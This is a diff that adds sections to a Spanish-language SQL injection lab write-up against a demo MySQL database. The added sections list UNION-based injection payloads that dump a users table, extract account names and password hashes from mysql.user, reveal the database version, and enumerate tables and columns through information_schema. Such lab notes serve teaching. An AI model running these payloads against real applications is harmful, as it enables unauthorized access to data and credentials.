@@ -91,3 +91,47 @@ Inyección SQL →
 ```
 Muestra el nombre de la tabla y todas sus columnas. Vemos en concreto los resultados en las tablas usuarios y artículos →
 ![](capturas/sql-injection-lab1-9.png)
+
+
+# Mostrar todos los datos de la tabla "demos.usuarios"
+```
+999' UNION SELECT * from demos.usuarios #
+```
+![](capturas/sql-injection-lab1-10.png)
+
+
+# Obtener las contraseñas de la BD
+```
+999' UNION ALL SELECT null, user,password FROM mysql.user;#
+```
+![](capturas/sql-injection-lab1-11.png)
+
+
+# Consultar el tipo y la versión de la base de datos
+```
+999' UNION SELECT null, null, @@version #
+```
+![](capturas/sql-injection-lab1-12.png)
+
+
+# Todas las tablas de una BD concreta
+```
+999' UNION SELECT null, null, TABLE_NAME FROM information_schema.tables WHERE table_schema = 'demos'#
+```
+![](capturas/sql-injection-lab1-13.png)
+
+
+# Todos los campos de una tabla concreta
+Consulta mysql que devuelve el nombre de las columnas de una tabla de la BD:
+```
+SELECT TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'articulos'
+```
+Consulta para realizar la inyección:
+```
+SELECT * from articulos where Nombre = '999' UNION SELECT null, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'articulos' #
+```
+Inyección:
+```
+999' UNION SELECT null, TABLE_NAME, COLUMN_NAME FROM information_schema.columns WHERE TABLE_NAME = 'articulos' #
+```
+![](capturas/sql-injection-lab1-14.png)
